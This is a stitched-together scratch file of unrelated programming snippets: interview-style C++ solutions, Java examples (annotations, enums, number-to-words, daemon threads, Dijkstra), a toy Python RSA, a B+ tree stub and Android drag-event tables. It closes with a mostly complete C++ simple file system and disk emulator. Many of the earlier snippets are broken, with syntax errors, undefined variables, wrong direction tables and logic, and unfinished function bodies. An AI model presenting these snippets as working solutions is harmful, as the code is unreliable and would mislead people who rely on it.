return ans;

}
}

------------------------------------------------------------------------------------------------------------
Bounded Circles
------------

class Solution 
{
public : 
bool isRoundBounded(string instructions){
int x = 0, y = 0, d = 0, dir[4][2] = {{0,1},{-1,0},{1,0}};
for(int i = 0; i <4; ++i){
if(c == 'G')x += dir[d][0], y += dir[d][1];
else if (c == 'L') d = (d  + 1) % 4;
else d = (d + 3)% 4;

}
if(x == 0 && y == 0) return true;

}
return false;

}

};
-----------------------------------------------------------------------------
Binary search tree to Greater Search tree
-------------------------------------------

class Solution {
public : 
int sum = 0;
private  :
TreeNode* bstToGst(TreeMode* root){
if(!root)  return NULL;
bstToGst(root->right);
root->val = (sum += root->val);
bstToGst(root->left);
return root;



}
};

------------------------------------------------------------------------------

Annotations in java
--------------------------

@Target(ElementType.TYPE)
public @interface ToDo {

}


import java.lang.reflect.Method;

public class StubFinder {
public static void main(String[] args) throws Exception{
if(args.length != 1){
System.arr.println("usage : java Stubfinder classFile ");
return;

}

Method[]  method = Class.forName(args[0]).getMethods();
for(int i = 0; i < Methods.length; i++){
if(methods[i].isAnnotationPresent(stub.class));
{
Stub stub = methods[i].getAnnotation(stub.class);
System.out.println()
}
}
}
}


--------------------------------------------------------------------------------

using the compass enum 
----------------------------

public class Compass{
int i = (int) (Math.random() * 4);
Compass[] dir = {compass.NORTH, Compass.EAST, Compass.SOUTH, Compass.WEST};
switch(dir[i]){
case NORTH : 
cas SOUTH:
case EAST;
case WEST;
default : assert false;

}
}
}


Converting  an Integer to words
---------------------------------

public class digits{
public static void main(String[] args){
if(args.length != 1){
System.err.println("usage : java.DigitsToWords integer");
return;

}
System.out.println(convertdigits(Integer.parseInt(args[0])));

}

static String convertToDigits {
if(integer < 0 || integer > 9999){
throw IllegalArgumentException("Out of REach" + integer);
if(integer == 0)
return "zero";
string[] group1 = {};
string[] group2 = {};
string[] group3 = {};
StringBuffer result  = new StringBuffer();
if(integer >= 1000)
{
int tmp = integer / 1000;
result.append(group[tmp - 1] + "thousand");
integer -= tmp * 1000;
if(integer == 0 ){
return result.toString();
result.append("");

}
if(integer >= 100){
int tmp = integer / 100;
result.append(group1[tmp - 1] + "hundred");
integer -= tmp * 1000;
if(integer == 0)
return result.toString();
result.append("and");



}
}
}
}
}
---------------------------------------------------

Daemon Threads
----------------

public class Threads{
public static void main(String[] args){
Runnable r  = new Runnable() {
@Override
public void run()
{
String name = Thread.currentThread().getName();
int count = 0;
while(true)
System.out.println(name + " : " + count++);

}
};
Thread thdA = new Thread(r);
thdA.setDaemon(true);
Thread thB = new Thread(r);
thdB.setDaemon(true);
thdA.start();
thdB.start();

}
}



---------------------------------------------------------------------------------------
Dumping all env variable to standard output 
_------------------------------------------------

public class Soultion {
public class void main(String[] args){
System.out.println(System.getenv());

}
}

-------------------------------------------------------------------------
RSA in python 
--------------

from decimal import Decimal
def gcd(a,b) :
if b=0 :
return a
else:
return gcd(b,a%b)
p = int(input('Enter a number'))
q = int(input('Enter a number'))
no - int(input('Enter a value of text'))
n = p*q
t = (p-1)*(q-1)
for e in range(2,t):
if gcd(e,t)== 1:
break

for  i in range(1,10):
x = 1 + i*t
if x % e == 0:
d = int(x/e)
break
ctt = Decimal(0)
ctt = pow(no,e)
ct = ctt % n

dtt = Decimal(0)
dtt = pow(ct,d)
dt = dtt % n

print('n = '+str(n)+'e = '+str(e)+' t = '+str(t)+' like wise all .......)

------------------------------------------------------------------------------------------


Quiz is coming 
---------------------
---------------------------------------------------------------------------
B+ tree
--------------
#include<climits>
#include<fstream>
#include<iostream>
#include<sstream>
using namespace std;
int MAX = 3;

class Node  {
bool  IS_LEAF;
int *key,size;
Node **ptr;
friend class BPTree;

public : 
Node();

};

class BPT {
Node *root;
void insertInternal(int, Node* , Node *);
Node *findParent(Node *, Node *);

public : 
BPTree();
void search(int);
void insert(int);
void display(Node *)
Node *getRoot();
};

Node::Node(){
key = new int[MAX];;
ptr = new Node *[MAX + 1];
}
BPTree::BPTree(){
root = NULL;

}

void BPTree::search(int x){
if (root == null){
cout << "Tree is empry \n";

}else{

}
}


------------------------------------------------------------

drag and drop in android 
----------------------------




ACTION_DRAG_STARTED

Signals the start of a drag and drop operation.

2	
ACTION_DRAG_ENTERED

Signals to a View that the drag point has entered the bounding box of the View.

3	
ACTION_DRAG_LOCATION

Sent to a View after ACTION_DRAG_ENTERED if the drag shadow is still within the View object's bounding box.

4	
ACTION_DRAG_EXITED

Signals that the user has moved the drag shadow outside the bounding box of the View.

5	
ACTION_DROP

Signals to a View that the user has released the drag shadow, and the drag point is within the bounding box of the View.

6	
ACTION_DRAG_ENDED

Signals to a View that the drag and drop operation has concluded.







-------------------------------------------------------------------------

1	
int getAction()

Inspect the action value of this event..

2	
ClipData getClipData()

Returns the ClipData object sent to the system as part of the call to startDrag().

3	
ClipDescription getClipDescription()

Returns the ClipDescription object contained in the ClipData.

4	
boolean getResult()

Returns an indication of the result of the drag and drop operation.

5	
float getX()

Gets the X coordinate of the drag point.

6	
float getY()

Gets the Y coordinate of the drag point.

7	
String toString()

Returns a string representation of this DragEvent object.
----------------------------------------------------------------------------

public static Graph calculateSHorttestPATHFROMsOURCE(Graph graph, Node source){
source.setDistance(0);
Set<Node> settledNodes = new HashSet<>();
Set<Node> unsettledNOdes = new HashSet<>();

unsettledNodes.add(source);

while(unsettledNOdes.size() != 0){
Node currentNode = getLowestDistanceNodes(unsettledNodes);
unsettledNodes.remove(currentNode);
for(Entry <Node, Integer> adjacentPair :
currentNode.getAdjacentNodes().entrySet()){
Node adjacentNode = adjacentPair.getKey();
Integer edgeWeight = adjacentPair.getValue();
if(!settledNodes.contains(adjacentNode)){
calculateMinimumDistance(adjacentNode, edgeWeight, currentNode);
unsettledNOdes.add(adjacentNode);

}
}
settledNodes.add(currentNode);

}
return graph ;


private static NOde getLowestDistanceNodes(Set <Node> unsettledNOdes){

Node lowestDistanceNode = null;
int lowestDistance = Integer.MAX_VALUE;
for(Node node : unsettledNOdes){
int nodesDistance = node.getDistance();
if(nodeDistance < lowestDistance){
lowestDistance = nodeDistance;
lowestDistanceNode = node;

}
}
return lowestDistanceNode;

}



private static void calculateMinimumDistance(Node evaluationNode, Integer edgeWeight, Node sourceNode) {
Integer sourceDistance = sourceNode.getDistance();
if(sourecDistance + edegWeight < evaluationNode.getDistance()){
evaluationNode.setDistance(sourceDistance + edegWeight);
LinkedList<Node> shortestPath = new LinkedList<>(SourceNode.getShortestPath())
;
ShortestPath.add(sourceNode);
evaluationNode.setShortestPath(shortestPath);
}
}


Node nodeA = new Node("A");
Node nodeB = new Node("B");
Node nodeC = new Node("C");
Node nodeD = new Node("D"); 
Node nodeE = new Node("E");
Node nodeF = new Node("F");
 
nodeA.addDestination(nodeB, 10);
nodeA.addDestination(nodeC, 15);
 
nodeB.addDestination(nodeD, 12);
nodeB.addDestination(nodeF, 15);
 
nodeC.addDestination(nodeE, 10);
 
nodeD.addDestination(nodeE, 2);
nodeD.addDestination(nodeF, 1);
 
nodeF.addDestination(nodeE, 5);

Graph graph = new Graph();
graph.addNode(nodeA);
graph.addNode(nodeB);
graph.addNode(nodeC);
graph.addNode(nodeD);
graph.addNode(nodeE);
graph.addNode(nodeF);


graph = Dijstra.calculateShortestPathFromSource(graph, nodeA);

--------------------------------------------------------------------------

// fs.cpp: File System

#include "sfs/fs.h"

#include <algorithm>

#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <cmath>

// Debug file system -----------------------------------------------------------

void FileSystem::debug(Disk *disk) {
    Block block;
    Block block2;
    uint32_t indir;
    unsigned int inode_block_count;
    std::string direct;
    std::string indirect;
    // Read Superblock
    disk->read(0, block.Data);

    printf("SuperBlock:\n");
    if (block.Super.MagicNumber == MAGIC_NUMBER) {
        printf("    magic number is valid\n");
    } else {
        printf("    magic number is invalid\n");
    }
    printf("    %u blocks\n"         , block.Super.Blocks);
    printf("    %u inode blocks\n"   , block.Super.InodeBlocks);
    printf("    %u inodes\n"         , block.Super.Inodes);

    // Read Inode blocks
    inode_block_count = block.Super.InodeBlocks;

    for (unsigned int k = 0; k < inode_block_count; k++) {
        disk->read(1+k, block.Data);
        for (unsigned int i = 0; i < INODES_PER_BLOCK; i++) {
            direct = "";
            indirect = "";
            if (!block.Inodes[i].Valid) {
                continue;
            }
            for (unsigned int j = 0; j < POINTERS_PER_INODE; j++) {
                if (block.Inodes[i].Direct[j] != 0) {
                    direct += " ";
                    direct += std::to_string(block.Inodes[i].Direct[j]);
                }
            }
            indir = block.Inodes[i].Indirect;
            if (indir != 0) {
                disk->read(indir, block2.Data);
                for (unsigned int l = 0; l < POINTERS_PER_BLOCK; l++) {
                    if (block2.Pointers[l] != 0) {
                        indirect += " ";
                        indirect += std::to_string(block2.Pointers[l]);
                    }
                }
            }
            printf("Inode %u:\n", i);
            printf("    size: %u bytes\n"    , block.Inodes[i].Size);
            printf("    direct blocks:%s\n" , direct.c_str());
            if (indirect.length() > 0) {
                printf("    indirect block: %u\n", indir);
                printf("    indirect data blocks:%s\n", indirect.c_str());
            }
        }
    }
}

// Format file system ----------------------------------------------------------

bool FileSystem::format(Disk *disk) {
    // Check if mounted
    if (disk->mounted()) {
        return false;
    }
    // Write superblock
    Block block;
    memset(block.Data,0,disk->BLOCK_SIZE);
    block.Super.MagicNumber = MAGIC_NUMBER;
    block.Super.Blocks = disk->size();
    block.Super.InodeBlocks = (size_t)(((float)disk->size()*0.1)+0.5);
    block.Super.Inodes = INODES_PER_BLOCK*block.Super.InodeBlocks;
    disk->write(0, block.Data);

    // Clear all other blocks
    char clear[BUFSIZ] = {0};
    for (size_t i=1; i<block.Super.Blocks; i++) {
        disk->write(i, clear);
    }

    return true;
}

// Mount file system -----------------------------------------------------------

bool FileSystem::mount(Disk *disk) {

    // Make usre disk isn't mounted
    if (disk->mounted()) {
        return false;
    }

    // Read superblock
    Block block;
    disk->read(0, block.Data);

    // make sure inodes counts match
    if (block.Super.Inodes != block.Super.InodeBlocks * INODES_PER_BLOCK) {
        return false;
    }

    // check magic number
    if (block.Super.MagicNumber != MAGIC_NUMBER) {
        return false;
    }

    // make sure there are blocks
    if (block.Super.Blocks < 0) {
        return false;
    }

    // check inode proportion
    if (block.Super.InodeBlocks != ceil(.1 * block.Super.Blocks)) {
        return false;
    }

    disk->mount();

    // Copy metadata
    num_blocks = block.Super.Blocks;
    num_inode_blocks = block.Super.InodeBlocks;
    num_inodes = block.Super.Inodes;
    this->disk = disk;

    // Allocate free block bitmap
    free_bitmap = std::vector<int> (num_blocks,1);

    //set all blocks to free initially
    for (uint32_t i = 0; i < num_blocks; i++) {
        free_bitmap[i] = 1;
    }

    // superblock is not free
    free_bitmap[0] = 0;

    // inode blocks are not free
    for (unsigned int i = 0; i < num_inode_blocks; i++) {
        free_bitmap[1+i] = 0;
    }

    //TODO: read inodes to determine which blocks are free
    for (uint32_t inode_block = 0; inode_block < num_inode_blocks; inode_block++) {
        Block b;
        disk->read(1+inode_block,b.Data);
        // reads each inode
        for (uint32_t inode = 0; inode < INODES_PER_BLOCK; inode++) {
            // if it's not valid, it has no blocks
            if (!b.Inodes[inode].Valid) {
                continue;
            }
            uint32_t n_blocks = (uint32_t)ceil(b.Inodes[inode].Size/(double)disk->BLOCK_SIZE);
            // read all direct blocks
            for (uint32_t pointer = 0; pointer < POINTERS_PER_INODE && pointer < n_blocks; pointer++) {
                free_bitmap[b.Inodes[inode].Direct[pointer]] = 0;
            }

            //read indirect block if necessary
            if (n_blocks > POINTERS_PER_INODE) {
                Block indirect;
                disk->read(b.Inodes[inode].Indirect,indirect.Data);
                free_bitmap[b.Inodes[inode].Indirect] = 0;
                for (uint32_t pointer = 0; pointer < n_blocks - POINTERS_PER_INODE; pointer++) {
                    free_bitmap[indirect.Pointers[pointer]] = 0;
                }
            }
        }
    }

    return true;
}

// Create inode ----------------------------------------------------------------

ssize_t FileSystem::create() {

    // Locate free inode in inode table
    int ind = -1;
    for (uint32_t inode_block = 0; inode_block < num_inode_blocks; inode_block++) {
        Block b;
        disk->read(1+inode_block,b.Data);
        // reads each inode
        for (uint32_t inode = 0; inode < INODES_PER_BLOCK; inode++) {
            // if it's not valid, it's free to be written
            if (!b.Inodes[inode].Valid) {
                ind = inode + INODES_PER_BLOCK*inode_block;
                break;
            }
        }
        if (ind != -1) {
            break;
        }
    }

    // Record inode if found
    if (ind == -1) {
        return -1;
    }
    Inode i;
    i.Valid = true;
    i.Size = 0;
    for (unsigned int j = 0; j < POINTERS_PER_INODE; j++) {
        i.Direct[j] = 0;
    }
    i.Indirect = 0;
    save_inode(ind, &i);

    return ind;
}

// Remove inode ----------------------------------------------------------------

bool FileSystem::remove(size_t inumber) {
    Inode node;

    // Load inode information
    if (!load_inode(inumber, &node)) {
        return false;
    }
    if (node.Valid == 0) {
        return false;
    }

    // Free direct blocks
    for (unsigned int i = 0; i < POINTERS_PER_INODE; i++) {
        if (node.Direct[i] != 0) {
            free_bitmap[node.Direct[i]] = 1;
            node.Direct[i] = 0;
        }
    }

    // Free indirect blocks
    if (node.Indirect != 0) {
        free_bitmap[node.Indirect] = 1;
        Block b;
        disk->read(node.Indirect,b.Data);
        // Free blocks pointed to indirectly
        for (unsigned int i = 0; i < POINTERS_PER_BLOCK; i++) {
            if (b.Pointers[i] != 0) {
                free_bitmap[b.Pointers[i]] = 1;
            }
        }
    }
    // Clear inode in inode table
    node.Indirect = 0;
    node.Valid = 0;
    node.Size = 0;
    if (!save_inode(inumber, &node)) {
        return false;
    };

    return true;
}

// Inode stat ------------------------------------------------------------------

ssize_t FileSystem::stat(size_t inumber) {
    // Load inode information
    Inode i;
    if (!load_inode(inumber,&i) || !i.Valid) {
        return -1;
    }

    return i.Size;
}

// Read from inode -------------------------------------------------------------

ssize_t FileSystem::read(size_t inumber, char *data, size_t length, size_t offset) {
    // Load inode information
    Inode inode;
    if (!load_inode(inumber, &inode) || offset > inode.Size) {
        return -1;
    }

    // Adjust length
    length = std::min(length, inode.Size - offset);

    uint32_t start_block = offset / disk->BLOCK_SIZE;

    // Read block and copy to data; use memcpy

    // Get indirect block number if it will need it
    Block indirect;
    if ((offset + length) / disk->BLOCK_SIZE > POINTERS_PER_INODE) {
        // make sure direct block is allocated
        if (inode.Indirect == 0) {
            return -1;
        }
        disk->read(inode.Indirect,indirect.Data);
    }

    size_t read = 0;
    for (uint32_t block_num = start_block; read < length; block_num++) {
        
        // figure out which block we're reading
        size_t block_to_read;
        if (block_num < POINTERS_PER_INODE) {
            block_to_read = inode.Direct[block_num];
        } else {
            block_to_read = indirect.Pointers[block_num-POINTERS_PER_INODE];
        }

        //make sure block is allocated
        if (block_to_read == 0) {
            return -1;
        }

        //get the block -- from either direct or indirect
        Block b;
        disk->read(block_to_read,b.Data);
        size_t read_offset;
        size_t read_length;

        // if it's the first block read, have to start from an offset
        // and read either until the end of the block, or the whole request
        if (read == 0) {
            read_offset = offset % disk->BLOCK_SIZE;
            read_length = std::min(disk->BLOCK_SIZE - read_offset, length);
        } else {
            // otherwise, start from the beginning, and read
            // either the whole block or the rest of the request
            read_offset = 0;
            read_length = std::min(disk->BLOCK_SIZE-0, length-read);
        }
        memcpy(data + read, b.Data + read_offset, read_length);
        read += read_length;
    }
    return read;
}

// Allocate free block --------------------------------------------------------------
ssize_t FileSystem::allocate_free_block() {
    int block = -1;
    for (unsigned int i = 0; i < num_blocks; i++) {
        if (free_bitmap[i]) {
            free_bitmap[i] = 0;
            block = i;
            break;
        }
    }

    // need to zero data block if we're allocating one
    if (block != -1) {
        char data[disk->BLOCK_SIZE];
        memset(data,0,disk->BLOCK_SIZE);
        disk->write(block,(char*)data);
    }

    return block;
}

// Write to inode --------------------------------------------------------------

ssize_t FileSystem::write(size_t inumber, char *data, size_t length, size_t offset) {
    // Load inode
    Inode inode;
    if (!load_inode(inumber, &inode) || offset > inode.Size) {
        return -1;
    }

    size_t MAX_FILE_SIZE = disk->BLOCK_SIZE * (POINTERS_PER_INODE*POINTERS_PER_BLOCK);

    // Adjust length
    length = std::min(length, MAX_FILE_SIZE-offset);
    
    uint32_t start_block = offset / disk->BLOCK_SIZE;
    Block indirect;
    bool read_indirect = false;

    bool modified_inode = false;
    bool modified_indirect = false;

    // Write block and copy data
    size_t written = 0;
    for (uint32_t block_num = start_block; written < length && block_num < POINTERS_PER_INODE + POINTERS_PER_BLOCK; block_num++) {
        
        // figure out which block we're reading
        size_t block_to_write;
        if (block_num < POINTERS_PER_INODE) {
            // Allocate block if necessary
            if (inode.Direct[block_num] == 0) {
                ssize_t allocated_block = allocate_free_block();
                if (allocated_block == -1) {
                    break;
                }
                inode.Direct[block_num] = allocated_block;
                modified_inode = true;
            }
            block_to_write = inode.Direct[block_num];
        } else { // Indirect block
            // Allocate indirect block if necessary
            if (inode.Indirect == 0) {
                ssize_t allocated_block = allocate_free_block();
                if (allocated_block == -1) {
                    return written;
                }
                inode.Indirect = allocated_block;
                modified_indirect = true;
            }

            // Read indirect block if hasn't been read yet
            if (!read_indirect) {
                disk->read(inode.Indirect,indirect.Data);
                read_indirect = true;
            }

            // Allocate block if necessary
            if (indirect.Pointers[block_num - POINTERS_PER_INODE] == 0) {
                ssize_t allocated_block = allocate_free_block();
                if (allocated_block == -1) {
                    break;
                }
                indirect.Pointers[block_num - POINTERS_PER_INODE] = allocated_block;
                modified_indirect = true;
            }
            block_to_write = indirect.Pointers[block_num-POINTERS_PER_INODE];
        }

        //get the block -- from either direct or indirect
        size_t write_offset;
        size_t write_length;

        // if it's the first block written, have to start from an offset
        // and write either until the end of the block, or the whole request
        if (written == 0) {
            write_offset = offset % disk->BLOCK_SIZE;
            write_length = std::min(disk->BLOCK_SIZE - write_offset, length);
        } else {
            // otherwise, start from the beginning, and write
            // either the whole block or the rest of the request
            write_offset = 0;
            write_length = std::min(disk->BLOCK_SIZE-0, length-written);
        }

        char write_buffer[disk->BLOCK_SIZE];

        // if we're not writing the whole block, need to copy what's there
        if (write_length < disk->BLOCK_SIZE) {
            disk->read(block_to_write,(char*)write_buffer);
        }

        // copy into buffer
        memcpy(write_buffer + write_offset, data + written, write_length);
        disk->write(block_to_write,(char*)write_buffer);
        written += write_length;
    }

    // update inode size
    uint32_t new_size = std::max((size_t)inode.Size, written + offset);
    if (new_size != inode.Size) {
        inode.Size = new_size;
        modified_inode = true;
    }

    // save inode and indirect if necessary
    if (modified_inode) {
        save_inode(inumber,&inode);
    }
     
    if (modified_indirect) {
        disk->write(inode.Indirect,indirect.Data);
    }

    return written;
}

// Load inode --------------------------------------------------------------
bool FileSystem::load_inode(size_t inumber, Inode *node) {
    size_t block_number = 1 + (inumber / INODES_PER_BLOCK);
    size_t inode_offset = inumber % INODES_PER_BLOCK;

    if (inumber >= num_inodes) {
        return false;
    }

    Block block;
    disk->read(block_number,block.Data);

    *node = block.Inodes[inode_offset];

    return true;
}


// Save inode --------------------------------------------------------------
bool FileSystem::save_inode(size_t inumber, Inode *node) {

    size_t block_number = 1 + inumber / INODES_PER_BLOCK;
    size_t inode_offset = inumber % INODES_PER_BLOCK;

    if (inumber >= num_inodes) {
        return false;
    }

    Block block;
    disk->read(block_number,block.Data);
    block.Inodes[inode_offset] = *node;
    disk->write(block_number,block.Data);

    return true;
}
// vim: set sts=4 sw=4 ts=8 expandtab ft=cpp:
--------------------------------------------------------------------------------------

// disk.cpp: disk emulator

#include "sfs/disk.h"

#include <stdexcept>

#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

void Disk::open(const char *path, size_t nblocks) {
    FileDescriptor = ::open(path, O_RDWR|O_CREAT, 0600);
    if (FileDescriptor < 0) {
    	char what[BUFSIZ];
    	snprintf(what, BUFSIZ, "Unable to open %s: %s", path, strerror(errno));
    	throw std::runtime_error(what);
    }

    if (ftruncate(FileDescriptor, nblocks*BLOCK_SIZE) < 0) {
    	char what[BUFSIZ];
    	snprintf(what, BUFSIZ, "Unable to open %s: %s", path, strerror(errno));
    	throw std::runtime_error(what);
    }

    Blocks = nblocks;
    Reads  = 0;
    Writes = 0;
}

Disk::~Disk() {
    if (FileDescriptor > 0) {
    	printf("%lu disk block reads\n", Reads);
    	printf("%lu disk block writes\n", Writes);
    	close(FileDescriptor);
    	FileDescriptor = 0;
    }
}

void Disk::sanity_check(int blocknum, char *data) {
    char what[BUFSIZ];

    if (blocknum < 0) {
    	snprintf(what, BUFSIZ, "blocknum (%d) is negative!", blocknum);
    	throw std::invalid_argument(what);
    }

    if (blocknum >= (int)Blocks) {
    	snprintf(what, BUFSIZ, "blocknum (%d) is too big!", blocknum);
    	throw std::invalid_argument(what);
    }

    if (data == NULL) {
    	snprintf(what, BUFSIZ, "null data pointer!");
    	throw std::invalid_argument(what);
    }
}

void Disk::read(int blocknum, char *data) {
    sanity_check(blocknum, data);

    if (lseek(FileDescriptor, blocknum*BLOCK_SIZE, SEEK_SET) < 0) {
    	char what[BUFSIZ];
    	snprintf(what, BUFSIZ, "Unable to lseek %d: %s", blocknum, strerror(errno));
    	throw std::runtime_error(what);
    }

    if (::read(FileDescriptor, data, BLOCK_SIZE) != BLOCK_SIZE) {
    	char what[BUFSIZ];
    	snprintf(what, BUFSIZ, "Unable to read %d: %s", blocknum, strerror(errno));
    	throw std::runtime_error(what);
    }

    Reads++;
}

void Disk::write(int blocknum, char *data) {
    sanity_check(blocknum, data);

    if (lseek(FileDescriptor, blocknum*BLOCK_SIZE, SEEK_SET) < 0) {
    	char what[BUFSIZ];
    	snprintf(what, BUFSIZ, "Unable to lseek %d: %s", blocknum, strerror(errno));
    	throw std::runtime_error(what);
    }

    if (::write(FileDescriptor, data, BLOCK_SIZE) != BLOCK_SIZE) {
    	char what[BUFSIZ];
    	snprintf(what, BUFSIZ, "Unable to write %d: %s", blocknum, strerror(errno));
    	throw std::runtime_error(what);
    }

    Writes++;
}
------------------------------------------------------------------------------------------------

// sfssh.cpp: Simple file system shell

#include "sfs/disk.h"
#include "sfs/fs.h"

#include <sstream>
#include <string>
#include <stdexcept>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Macros

#define streq(a, b) (strcmp((a), (b)) == 0)

// Command prototypes

void do_debug(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2);
void do_format(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2);
void do_mount(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2);
void do_cat(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2);
void do_copyout(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2);
void do_create(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2);
void do_remove(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2);
void do_stat(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2);
void do_copyin(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2);
void do_help(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2);

bool copyout(FileSystem &fs, size_t inumber, const char *path);
bool copyin(FileSystem &fs, const char *path, size_t inumber);

// Main execution

int main(int argc, char *argv[]) {
    Disk	disk;
    FileSystem	fs;

    if (argc != 3) {
    	fprintf(stderr, "Usage: %s <diskfile> <nblocks>\n", argv[0]);
    	return EXIT_FAILURE;
    }

    try {
    	disk.open(argv[1], atoi(argv[2]));
    } catch (std::runtime_error &e) {
    	fprintf(stderr, "Unable to open disk %s: %s\n", argv[1], e.what());
    	return EXIT_FAILURE;
    }

    while (true) {
	char line[BUFSIZ], cmd[BUFSIZ], arg1[BUFSIZ], arg2[BUFSIZ];

    	fprintf(stderr, "sfs> ");
    	fflush(stderr);

    	if (fgets(line, BUFSIZ, stdin) == NULL) {
    	    break;
    	}

    	int args = sscanf(line, "%s %s %s", cmd, arg1, arg2);
    	if (args == 0) {
    	    continue;
	}

	if (streq(cmd, "debug")) {
	    do_debug(disk, fs, args, arg1, arg2);
	} else if (streq(cmd, "format")) {
	    do_format(disk, fs, args, arg1, arg2);
	} else if (streq(cmd, "mount")) {
	    do_mount(disk, fs, args, arg1, arg2);
	} else if (streq(cmd, "cat")) {
	    do_cat(disk, fs, args, arg1, arg2);
	} else if (streq(cmd, "copyout")) {
	    do_copyout(disk, fs, args, arg1, arg2);
	} else if (streq(cmd, "create")) {
	    do_create(disk, fs, args, arg1, arg2);
	} else if (streq(cmd, "remove")) {
	    do_remove(disk, fs, args, arg1, arg2);
	} else if (streq(cmd, "stat")) {
	    do_stat(disk, fs, args, arg1, arg2);
	} else if (streq(cmd, "copyin")) {
	    do_copyin(disk, fs, args, arg1, arg2);
	} else if (streq(cmd, "help")) {
	    do_help(disk, fs, args, arg1, arg2);
	} else if (streq(cmd, "exit") || streq(cmd, "quit")) {
	    break;
	} else {
	    printf("Unknown command: %s", line);
	    printf("Type 'help' for a list of commands.\n");
	}
    }

    return EXIT_SUCCESS;
}

// Command functions

void do_debug(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2) {
    if (args != 1) {
    	printf("Usage: debug\n");
    	return;
    }

    fs.debug(&disk);
}

void do_format(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2) {
    if (args != 1) {
    	printf("Usage: format\n");
    	return;
    }

    if (fs.format(&disk)) {
    	printf("disk formatted.\n");
    } else {
    	printf("format failed!\n");
    }
}

void do_mount(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2) {
    if (args != 1) {
    	printf("Usage: mount\n");
    	return;
    }

    if (fs.mount(&disk)) {
    	printf("disk mounted.\n");
    } else {
    	printf("mount failed!\n");
    }
}

void do_cat(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2) {
    if (args != 2) {
    	printf("Usage: cat <inode>\n");
    	return;
    }

    if (!copyout(fs, atoi(arg1), "/dev/stdout")) {
    	printf("cat failed!\n");
    }
}

void do_copyout(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2) {
    if (args != 3) {
    	printf("Usage: copyout <inode> <file>\n");
    	return;
    }

    if (!copyout(fs, atoi(arg1), arg2)) {
    	printf("copyout failed!\n");
    }
}

void do_create(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2) {
    if (args != 1) {
    	printf("Usage: create\n");
    	return;
    }

    ssize_t inumber = fs.create();
    if (inumber >= 0) {
    	printf("created inode %ld.\n", inumber);
    } else {
    	printf("create failed!\n");
    }
}

void do_remove(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2) {
    if (args != 2) {
    	printf("Usage: remove <inode>\n");
    	return;
    }

    ssize_t inumber = atoi(arg1);
    if (fs.remove(inumber)) {
    	printf("removed inode %ld.\n", inumber);
    } else {
    	printf("remove failed!\n");
    }
}

void do_stat(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2) {
    if (args != 2) {
    	printf("Usage: stat <inode>\n");
    	return;
    }

    ssize_t inumber = atoi(arg1);
    ssize_t bytes   = fs.stat(inumber);
    if (bytes >= 0) {
    	printf("inode %ld has size %ld bytes.\n", inumber, bytes);
    } else {
    	printf("stat failed!\n");
    }
}

void do_copyin(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2) {
    if (args != 3) {
    	printf("Usage: copyin <inode> <file>\n");
    	return;
    }

    if (!copyin(fs, arg1, atoi(arg2))) {
    	printf("copyin failed!\n");
    }
}

void do_help(Disk &disk, FileSystem &fs, int args, char *arg1, char *arg2) {
    printf("Commands are:\n");
    printf("    format\n");
    printf("    mount\n");
    printf("    debug\n");
    printf("    create\n");
    printf("    remove  <inode>\n");
    printf("    cat     <inode>\n");
    printf("    stat    <inode>\n");
    printf("    copyin  <file> <inode>\n");
    printf("    copyout <inode> <file>\n");
    printf("    help\n");
    printf("    quit\n");
    printf("    exit\n");
}

bool copyout(FileSystem &fs, size_t inumber, const char *path) {
    FILE *stream = fopen(path, "w");
    if (stream == nullptr) {
    	fprintf(stderr, "Unable to open %s: %s\n", path, strerror(errno));
    	return false;
    }

    char buffer[4*BUFSIZ] = {0};
    size_t offset = 0;
    while (true) {
    	ssize_t result = fs.read(inumber, buffer, sizeof(buffer), offset);
    	if (result <= 0) {
    	    break;
	}
	fwrite(buffer, 1, result, stream);
	offset += result;
    }

    printf("%lu bytes copied\n", offset);
    fclose(stream);
    return true;
}

bool copyin(FileSystem &fs, const char *path, size_t inumber) {
    FILE *stream = fopen(path, "r");
    if (stream == nullptr) {
    	fprintf(stderr, "Unable to open %s: %s\n", path, strerror(errno));
    	return false;
    }

    char buffer[4*BUFSIZ] = {0};
    size_t offset = 0;
    while (true) {
    	ssize_t result = fread(buffer, 1, sizeof(buffer), stream);
    	if (result <= 0) {
    	    break;
	}

	ssize_t actual = fs.write(inumber, buffer, result, offset);
	if (actual < 0) {
	    fprintf(stderr, "fs.write returned invalid result %ld\n", actual);
	    break;
	}
	offset += actual;
	if (actual != result) {
	    fprintf(stderr, "fs.write only wrote %ld bytes, not %ld bytes\n", actual, result);
	    break;
	}
    }

    printf("%lu bytes copied\n", offset);
    fclose(stream);
    return true;
}

----------------------------------------------------------------------------------------------------------

// disk.h: Disk emulator

#pragma once

#include <stdlib.h>

class Disk {
private:
    int	    FileDescriptor; // File descriptor of disk image
    size_t  Blocks;	    // Number of blocks in disk image
    size_t  Reads;	    // Number of reads performed
    size_t  Writes;	    // Number of writes performed
    size_t  Mounts;	    // Number of mounts

    // Check parameters
    // @param	blocknum    Block to operate on
    // @param	data	    Buffer to operate on
    // Throws invalid_argument exception on error.
    void sanity_check(int blocknum, char *data);

public:
    // Number of bytes per block
    const static size_t BLOCK_SIZE = 4096;
    
    // Default constructor
    Disk() : FileDescriptor(0), Blocks(0), Reads(0), Writes(0), Mounts(0) {}
    
    // Destructor
    ~Disk();

    // Open disk image
    // @param	path	    Path to disk image
    // @param	nblocks	    Number of blocks in disk image
    // Throws runtime_error exception on error.
    void open(const char *path, size_t nblocks);

